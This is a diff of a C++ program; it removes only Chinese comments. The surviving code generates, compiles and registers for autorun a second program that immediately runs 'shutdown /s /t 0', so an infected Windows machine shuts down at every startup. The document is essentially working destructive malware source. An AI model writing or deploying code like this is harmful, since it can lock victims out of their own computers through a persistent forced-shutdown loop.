@@ -15,21 +15,15 @@ void SetAutoRun(const std::string& programPath) {
 	}
 }
 int main() {
-	// 要写入的 C++ 代码
 	std::string code = "#include <iostream>\n#include <cstdlib>\nint main() {\nsystem(\"shutdown /s /t 0\");\nreturn 0;}";
-
-// 创建并打开一个新的 cpp 文件
 	std::ofstream outFile("generated_program.cpp");
 	if (!outFile) {
 	std::cerr << "无法创建文件!" << std::endl;
 	return 1;
 	}
-	
-	// 写入代码到文件
 	outFile << code;
 	outFile.close();
 	
-	// 编译生成的 cpp 文件
 	system("g++ generated_program.cpp -o generated_program");
 	std::string programPath = "generated_program.exe";
 	SetAutoRun(programPath);
